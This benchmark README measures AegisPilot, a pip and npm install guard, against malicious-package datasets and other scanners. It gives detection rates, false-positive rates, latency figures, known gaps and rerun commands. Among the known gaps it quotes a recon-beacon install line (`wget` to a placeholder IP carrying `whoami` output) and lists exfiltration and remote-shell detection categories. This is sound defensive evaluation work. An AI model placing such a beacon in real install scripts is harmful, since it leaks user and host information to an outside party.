# Benchmark

Measurements of AegisPilot against public malicious-package datasets and recent benign releases, compared with other open-source tools. The latest results (0.1.3, 2026-11-19) come first; the earlier file-scan results (2026-10-23/24, 0.1.1 rules) and their scripts follow.

## 0.1.3 results (2026-11-19)

### What was measured

- **AegisPilot as it really runs:** the Claude Code hook (`PreToolUse`) gets `pip install <name>==<version>` or `npm install <name>@<version>` in a fresh empty project, with OSV lookups, the ML models at their defaults, and the rules of the release. Each package is checked in user mode and in auto mode back to back.
- **Malicious samples are gone from the registries,** so each one is served to the real hook from its local file, with registry information that shows the release as published 0 to 30 days before the check. Nothing is installed or run.
- **The 24-hour rule for new releases is off** for these runs: it is a date check, not a judgement of the code, and it would make the false-positive rate depend on the day of the run.
- **Other tools** scan the same local files at their default settings: [GuardDog](https://github.com/DataDog/guarddog) 3.2.0, [Customs](https://github.com/yib7/customs) (commit 922fc47), [repo-forensics](https://github.com/alexgreensh/repo-forensics) (commit e67803d). "OSV alone" is a lookup of OSV malicious-package records (`MAL-`) for each name and version.

### Datasets

Built on 2026-11-17 (seed 20261117). No package of the earlier benchmark sets is reused.

| Set | Count | Source |
|---|---|---|
| Malicious PyPI | 1,000 | [pypi_malregistry](https://github.com/lxyeternal/pypi_malregistry) and the [Datadog dataset](https://github.com/DataDog/malicious-software-packages-dataset) |
| └ not in any training data | 178 | of the above: OSV malicious report on or after 2026-09-26, not in the training data of AegisPilot's ML model or of the compared tools as far as it is published |
| Malicious npm | 599 | Datadog dataset, samples found on or after 2026-03-01 (after the npm model's training data) |
| Benign PyPI | 1,000 | latest version first uploaded on or after 2026-10-15: 400 popular (download ranks 1 to 5,000), 300 mid (ranks 10,001 to 15,000), 300 newly created projects |
| Benign npm | 600 | latest version published on or after 2026-10-15: 300 popular, 300 less popular |

Benign versions that OSV lists as malicious are left out. **Bias:** most of the Datadog dataset was found with GuardDog's rules, which favors GuardDog on those samples.

### Detection and false positives

Share of packages stopped (%). AegisPilot user mode: asked or denied (denied only in brackets). Other tools: flagged as high risk or block (any finding or warning in brackets).

| | Malicious PyPI | └ not in training | Malicious npm | Benign PyPI | Benign npm |
|---|---|---|---|---|---|
| **AegisPilot 0.1.3, user mode** | **99.8** (93.2) | **100.0** (100.0) | **91.5** (81.5) | **11.0** (0.2) | **13.0** (0.0) |
| **AegisPilot 0.1.3, auto mode, final** | **99.8** | **100.0** | **90.9** | **1.8** | **3.8** |
| GuardDog 3.2.0 | 74.9 (79.2) | 51.1 (64.6) | 46.7 (75.5) | 6.4 (22.0) | 4.3 (14.3) |
| Customs 922fc47 | 70.5 (90.2) | 30.3 (61.2) | 58.6 (79.0) | 0.0 (0.3) | 0.0 (1.8) |
| repo-forensics e67803d | 82.6 (100.0) | 35.8 (100.0) | 37.5 (100.0) | 33.5 (100.0) | 7.8 (100.0) |
| OSV alone | 91.3 | 100.0 | 74.8 | 0.0 | 0.0 |

- **Auto mode, final** is what a real agent did in the end. The hook in auto mode refuses with its evidence, and the agent decides: another version, leaving it out, or the same install again (which passes once within 30 minutes, with a notice to the person). Claude Code ran in auto permission mode with `pip` and `npm` replaced by stubs that only record the command. A malicious package counts as missed when the agent installed the exact flagged version; malicious packages the hook refused were run for a random sample of 150 PyPI and 150 npm packages (0 and 1 installed), and the rest are counted at the same rate. A benign package counts as a false positive when it was refused and the agent did not install it (every refused benign package was run: of 108 refused PyPI packages the agent installed 90 after reading the evidence, of 77 npm packages 54).
- AegisPilot's numbers include its OSV lookup, as in a real install; "OSV alone" shows how much of that comes from OSV. The 178 recent PyPI samples all have OSV records, so they test the lookup more than the code analysis.
- repo-forensics reports a warning on every package, so its bracketed numbers are 100%. Its errors (155 malicious PyPI, 302 benign PyPI, fewer elsewhere) are left out of its denominators.
- For 3 of the 3,199 packages (very large releases) the benchmark runner stopped the hook at its own memory limit; they are counted as not stopped.

### Time added to an install

Hook time for 250 benign PyPI and 250 benign npm packages, run alone, with every default on (including the 24-hour rule), compared with the time of the same install without the guard (no cache). PyPI size is the installed size minus an empty virtual environment.

| Ecosystem | Installed size | Packages | Install alone (median s) | Added by the guard (median s) |
|---|---|---|---|---|
| PyPI | under 1 MB | 42 | 0.7 | +0.9 |
| PyPI | 1 to 10 MB | 51 | 1.1 | +2.0 |
| PyPI | 10 to 100 MB | 102 | 3.2 | +6.3 |
| PyPI | over 100 MB | 55 | 12.2 | +19.8 |
| **PyPI** | **all** | **250** | **2.4** | **+4.5** |
| npm | under 1 MB | 72 | 0.8 | +1.5 |
| npm | 1 to 10 MB | 62 | 1.5 | +1.9 |
| npm | 10 to 100 MB | 83 | 3.7 | +2.3 |
| npm | over 100 MB | 33 | 10.1 | +3.5 |
| **npm** | **all** | **250** | **1.8** | **+2.0** |

90th percentile: PyPI 22.9 s, npm 8.4 s. A package checked again within 6 hours is answered from the verdict cache.

The runners for these results are not in this folder yet; the scripts below are those of the earlier results.

## Earlier results (2026-10-23 and 2026-10-24, file scans)

This folder holds the scripts and the results of measuring AegisPilot against public malicious-package datasets, popular benign packages, and [GuardDog](https://github.com/DataDog/guarddog), run on the same local files.

Measurements were taken on 2026-10-23 and 2026-10-24. The numbers reflect the rules at that time; later rule changes are not reflected here.

- **Rules frozen:** rules and code were frozen before each run and not changed during measurement. Problems found during measurement are listed under "Known gaps" and were not fixed during measurement.
- **Data stays outside the repository:** datasets are downloaded outside the repository to the folder named by `AEGIS_BENCH` (about 1.5 GB malicious, 4.1 GB benign). Samples are only read, never executed.
- **Two sample sets:**
  - The **development set** was used while tuning the rules. Samples looked at during earlier rule tuning were excluded from it. Sampling seed 20261023.
  - The **evaluation set** is a fresh sample that was not opened during development. Rules and code were frozen before the run, and it was run once. Sampling seed 20261024.

**Bias:** the README of the Datadog dataset says most of its samples were found by GuardDog. GuardDog therefore has an advantage on the dd-* sets. malregistry is an academic collection independent of GuardDog.

### Datasets

External sources:

- Datadog [malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset) (dd-pypi, dd-npm)
- [pypi_malregistry](https://github.com/lxyeternal/pypi_malregistry) (malregistry)
- Benign packages: PyPI download rankings and popular npm packages

#### Evaluation set

Built with `build_datasets.py mal|benign --suffix eval --seed 20261024 --exclude manifest-mal.json manifest-benign.json --top-ranks 1001-5000`.

| Set | Count | Source |
|---|---|---|
| malregistry | 2,000 | random, from packages not used in the development set or dd-pypi |
| dd-npm | 600 | packages not used in the development set |
| Benign PyPI | 1,000 | download ranks 1,001 to 5,000 (development set names excluded) |
| Benign npm | 499 | collected with different search terms |

#### Development set

| Set | Count | Source |
|---|---|---|
| dd-pypi | 1,770 | Datadog dataset, all of PyPI (63 previously seen samples excluded) |
| dd-npm | 600 | same repository, 600 random npm packages |
| malregistry | 2,000 | random, out of 10,601 in pypi_malregistry |
| Benign PyPI top | 969 | latest release of the top 1,000 by downloads (31 over 50 MB excluded) |
| Benign PyPI longtail | 1,000 | random, ranks 5,000 to 15,000 |
| Benign PyPI new | 1,000 | recently registered projects |
| Benign npm | 499 | popular packages |

### Method

- `build_datasets.py`: downloads the datasets above and writes `manifest-mal.json` and `manifest-benign.json`.
- `run_eval.py aegis|guarddog|osv`: runs each tool on the same local files.
  - The guard uses code rules only (`scan_local_file` / `scan_files`, including install scripts for npm). PyPI metadata, OSV and ML are off. This is the same input as GuardDog's local scan.
  - The behavior check (`guard/behavior`: value recovery and data flow -> the `rules/behavior.json` policy table -> hard rules `behavior_block` / `behavior_review`) is included in the runs tagged `behavior`. The earlier weighted sum and rules were left unchanged.
  - GuardDog 3.x is run as `guarddog <eco> scan <path>`.
  - OSV is queried for MAL- records by name and version (the same as the guard's information layer).
- `report.py`: detection rate, false positive rate, per-year results, scan time.
  - Guard: "strict" = BLOCK, "broad" = REVIEW or higher.
  - GuardDog: "strict" = risk level high/critical, "broad" = one or more threat rules.
- `vuln_eval.py 60`: vulnerable versions. Picks 60 each of CRITICAL and HIGH OSV advisories and runs the real install decision (PyPI + OSV).
- `names_latency_eval.py names|latency`: name problems and install latency. Runs the real `check_command` in auto mode.

### Results: evaluation set (final numbers)

Measured 2026-10-24, with the behavior check, rules and code frozen before the run.

| Set | Count | Guard BLOCK | Guard REVIEW or higher | GuardDog high risk | GuardDog 1+ threats | OSV MAL | Guard + OSV |
|---|---|---|---|---|---|---|---|
| malregistry | 2,000 | 70.7% | 84.3% | 81.5% | 83.2% | 89.5% | 99.0% |
| dd-npm | 600 | 47.0% | 56.7% | 72.8% | 87.8% | 81.7% | 92.7% |
| Benign PyPI (ranks 1,001 to 5,000) | 1,000 | 0.1% | 2.0% | 5.3% | 14.5% | - | - |
| Benign npm | 499 | 0.2% | 0.6% | 0.6% | 5.4% | - | - |

| Set | Both | Guard only | GuardDog only | Both missed | Combined |
|---|---|---|---|---|---|
| malregistry | 1,604 | 83 | 59 | 254 | 87.3% |
| dd-npm | 329 | 11 | 198 | 62 | 89.7% |

- malregistry is independent of GuardDog. On it the guard catches more than GuardDog (REVIEW or higher 84.3% vs one or more threats 83.2%), with far fewer false positives (benign PyPI 2.0% vs 14.5%).
- On npm the guard is still below GuardDog (56.7% vs 87.8%). The Datadog dataset was largely found by GuardDog, which favors GuardDog (see "Bias" above).
- Detected malicious samples whose only hard-rule reason is the behavior check: malregistry 1,261 / 1,687, dd-npm 303 / 340. Most of the large rise in BLOCK (malregistry from about 9% before to 71%) comes from the behavior check.

Scan time (seconds, excluding download):

| Tool | Set | p50 | p95 | Max |
|---|---|---|---|---|
| Guard | malicious | 0.01 | 0.93 | 26.7 |
| Guard | benign | 0.09 | 3.91 | 51.5 |
| GuardDog | malicious | 1.05 | 1.32 | 34.4 |
| GuardDog | benign | 1.13 | 4.65 | 103.5 |

Contribution by finding (number of samples, finding/policy action, evaluation set):

- malregistry: install_process/review 1,176, decode_exec/block 1,061, suspicious_send/block 141, secret_exfil/block 102, sysinfo_beacon/review 97, download_exec/block 65, persistence/block 29, download_exec/review 27, hidden_call/review 11, remote_shell/block 8
- dd-npm: suspicious_send/block 208, install_process/review 86, sysinfo_beacon/review 79, secret_exfil/block 69, download_exec/block 27, remote_shell/block 12, persistence/block 7, decode_exec/block 4
- Benign PyPI (only those with an action): install_process/review 4, download_exec/review 3, hidden_call/review 3, unreadable_exec/review 2
- Benign npm (only those with an action): decode_exec/block 1, decode_exec/review 1, download_exec/review 1, hidden_call/review 1

### Results: development set, with the behavior check

Measured 2026-10-24. Same samples as the code-only run below, before -> after adding the behavior check.

| Set | BLOCK | REVIEW or higher | Newly caught / dropped |
|---|---|---|---|
| dd-pypi (1,770) | 19.2% → 70.6% | 82.4% → 91.4% | 159 / 0 |
| malregistry (1,998) | 9.4% → 71.3% | 79.3% → 84.3% | 101 / 0 |
| dd-npm (600) | 5.7% → 44.3% | 35.2% → 54.3% | 115 / 0 |
| Benign PyPI (2,968) | 0.1% → 0.2% | 1.3% → 1.4% | 5 / 0 |
| Benign npm (499) | 0.0% → 0.0% | 0.2% → 1.0% | 4 / 0 |

- The first run with the behavior check gave 3.2% on benign PyPI and 2.0% on benign npm. The causes of the 67 newly flagged benign packages were fixed, which gave the values above. The development set was used for this tuning; the evaluation set was not.
- Scan time: benign p95 rose from 1.54 to 5.31 seconds. Large packages (scipy, sympy, fonttools) hit the 10-second behavior analysis limit and some of their files are not analyzed. Files not analyzed are recorded in `behavior_not_analyzed`.

### Results: development set, code rules only

Measured 2026-10-23, before the behavior check was added.

#### Criterion 1: malicious detection (code only)

| Set | Guard BLOCK | Guard REVIEW or higher | GuardDog high risk | GuardDog 1+ threats | OSV MAL | Guard + OSV |
|---|---|---|---|---|---|---|
| dd-pypi | 19.2% | 82.4% | 84.3% | 87.7% | 74.0% | 88.7% |
| malregistry | 9.4% | 79.3% | 81.2% | 83.0% | 90.1% | 98.3% |
| dd-npm | 5.7% | 35.2% | 70.5% | 85.5% | 78.3% | 83.7% |

- In a real install the guard also checks OSV, so the real detection rate is close to the "Guard + OSV" column.
- The two tools complement each other (REVIEW or higher / one or more threats):

| Set | Both | Guard only | GuardDog only | Both missed | Combined |
|---|---|---|---|---|---|
| dd-pypi | 1,356 | 103 | 196 | 115 | 93.5% |
| malregistry | 1,531 | 53 | 126 | 288 | 85.6% |
| dd-npm | 208 | 3 | 305 | 84 | 86.0% |

By year (broad):

| Set / year | 2022 | 2023 | 2024 | 2025 | 2026 |
|---|---|---|---|---|---|
| Guard dd-pypi | 34.5% | 95.9% | 84.0% | 81.5% | 69.9% |
| GuardDog dd-pypi | 72.6% | 91.9% | 86.9% | 85.7% | 91.6% |
| Guard dd-npm | - | - | 18.2% | 47.2% | 29.5% |
| GuardDog dd-npm | - | - | 92.9% | 85.4% | 76.0% |

#### Criterion 2: false positives (benign packages)

| Set | Guard BLOCK | Guard REVIEW or higher | GuardDog high risk | GuardDog 1+ threats |
|---|---|---|---|---|
| PyPI top | 0.0% | 0.8% | 4.5% | 16.3% |
| PyPI longtail | 0.1% | 1.1% | 3.5% | 15.2% |
| PyPI new | 0.3% | 1.9% | 5.0% | 20.2% |
| npm popular | 0.0% | 0.2% | 2.2% | 16.6% |

- Rules most often behind guard false positives: keyword 34, agent_prompt_injection 13, install_hook 7.
- Rules most often behind GuardDog false positives: filesystem-read 179, runtime-environment-read 168, process-download-exec 74.

### Criterion 3: vulnerable versions (OSV advisories, real install decision)

Measured 2026-10-23.

| Severity | Count | BLOCK | REVIEW | ALLOW | Fixed version suggested |
|---|---|---|---|---|---|
| CRITICAL | 58 | 58 | 0 | 0 | 54 |
| HIGH | 60 | 22 | 38 | 0 | 52 |

- Most cases with no suggestion are correct: the advisory has only last_affected and no fixed version.
- One suggestion is wrong (gap 6 below).

### Criterion 4: name problems

Measured 2026-10-23.

- **Made-up names:** all 60 plausible names that do not exist on PyPI got REVIEW ("name not on PyPI"). In auto mode they are refused with an evidence card.
- **Typosquatting:** of 603 malicious samples within edit distance 2 of the top 5,000 popular names, the guard's name check caught 128 (21%). The guard's popular-name list had only 30 entries.

### Criterion 7: latency

Measured 2026-10-23.

Local file scan (excluding download):

| Tool | Set | p50 | p95 | Max |
|---|---|---|---|---|
| Guard | malicious | 0.02 s | 0.28 s | 135 s |
| Guard | benign | 0.04 s | 1.54 s | 61 s |
| GuardDog | malicious | 1.04 s | 1.28 s | 117 s |
| GuardDog | benign | 1.12 s | 4.74 s | 107 s |

Real `pip install` decision (PyPI + OSV + download, 40 packages per set):

| Set | p50 | p95 | Max | Refused in auto mode |
|---|---|---|---|---|
| top | 2.1 s | 4.8 s | 5.0 s | 0 / 40 |
| longtail | 2.5 s | 24.1 s | 24.5 s | 3 / 40 |
| new | 2.3 s | 24.0 s | 25.4 s | 40 / 40 |

- All refusals come from the "newly registered package" rule (first registered on PyPI within 30 days). This is a REVIEW by design; in auto mode the evidence card and ack id go to the agent, which decides.
- So the code-only false positive rate differs from the refusal rate of real installs. A new package gets one more confirmation even when its code is clean.
- p95 over 20 s is because, for packages with many dependencies, the dependencies are also downloaded and scanned (not verified; no per-package breakdown was done).

### Criteria not measured

- 5 (evasion reproduction), 6 (10 repeated runs with a real agent) and 10 (fault injection) were not run in this benchmark. They were only partly checked in earlier experiments and tests.

### Known gaps, not fixed during measurement

These were found during measurement and left unfixed so the numbers stay comparable.

#### From the evaluation-set run (2026-10-24)

1. **One benign npm BLOCK (webpack-dev-middleware, decode_exec import).** The cause was not examined (not verified: likely a decoded runtime data value treated as executed).
2. **Seven benign PyPI REVIEWs triggered by the behavior check alone.**
   - `install_process` (external command at install time): kerberos, uptime-kuma-api
   - `hidden_call` (function chosen through getattr): runs, kedro-datasets, whoosh
   - `download_exec` command/call: akshare, databricks-connect
   - The other 13 were triggered by existing rules (agent instructions, install hook + keyword, download chain and so on).
3. **npm detection is still low.** 198 dd-npm samples were missed by the guard and caught only by GuardDog. The shape of the missed code was not examined (not verified: likely known limits of the JavaScript analyzer `js.py`, such as webpack bundle module tables, require across files, and `this.x` state).
4. **A Telegram notification tool that sends its own token to the Telegram API is flagged as `secret_exfil` (call = block)** (development set, autorcode). This comes from the vocabulary that treats messenger addresses as suspicious destinations.

#### From the code-only run (2026-10-23)

1. **Low npm code detection (35%).** Of 80 sampled misses, 51 are runtime malicious code with no install script. The guard focuses on install-time threats and looks less at runtime code.
2. **Recon beacons in install scripts are missed.** Examples: preinstall `wget "http://IP/?user=$(whoami)..."`, or `node index.js` sending host information.
3. **Shai-Hulud (`setup_bun.js`) style compromised_lib samples are missed.**
4. **Low detection on 2022 PyPI samples (34.5%).** That year's techniques are less covered by the rules.
5. **The typosquatting popular-name list has only 30 entries,** so it catches only 21%.
6. **Wrong fixed-version suggestion for lnbits 0.12.9 (0.12.12).** The PYSEC record says fixed 0.12.12 and the GHSA record says last_affected 0.12.12, which disagree. The suggestion does not take last_affected into account.
7. **Long maximum scan time (135 s).** Caused by a few large files. In a real install it fits within the scan budget (540 s).

### How to rerun

Run from the repository root with `AEGIS_BENCH` set to the dataset folder outside the repository. GuardDog runs need a separate environment with GuardDog 3.x.

```
export AEGIS_BENCH=/path/to/bench        # outside the repository
python3 -I benchmark/build_datasets.py
python3 -I benchmark/run_eval.py osv
python3 -I benchmark/run_eval.py aegis
python3 -I benchmark/run_eval.py guarddog      # needs GuardDog 3.x
python3 -I benchmark/report.py results/summary.json
python3 -I benchmark/vuln_eval.py 60 results/vuln.json
python3 -I benchmark/names_latency_eval.py names results/names.json
python3 -I benchmark/names_latency_eval.py latency results/latency.json   # run alone, with nothing else running

# behavior check, development set -> aegis-behavior.jsonl
python3 -I benchmark/run_eval.py aegis --tag behavior
python3 -I benchmark/report.py --aegis aegis-behavior --compare aegis

# evaluation set (run once)
python3 -I benchmark/build_datasets.py mal --suffix eval --seed 20261024 --exclude manifest-mal.json manifest-benign.json
python3 -I benchmark/build_datasets.py benign --suffix eval --seed 20261024 --exclude manifest-mal.json manifest-benign.json --top-ranks 1001-5000
python3 -I benchmark/run_eval.py aegis --tag behavior --manifests eval
python3 -I benchmark/run_eval.py osv --manifests eval
python3 -I benchmark/run_eval.py guarddog --manifests eval
python3 -I benchmark/report.py --aegis aegis-behavior-eval --suffix eval
```

The lists of samples looked at during rule tuning (excluded from the sets above) and the popular npm name list are not distributed. `build_datasets.py` reads them from `$AEGIS_BENCH/seen/` and `$AEGIS_BENCH/npm_names.txt` when present and skips them otherwise, so a rerun without them draws slightly different samples.

Results are written under `results/` in the `AEGIS_BENCH` folder (for example `aegis-behavior-eval.jsonl`, `guarddog-eval.jsonl`, `osv-eval.jsonl`).
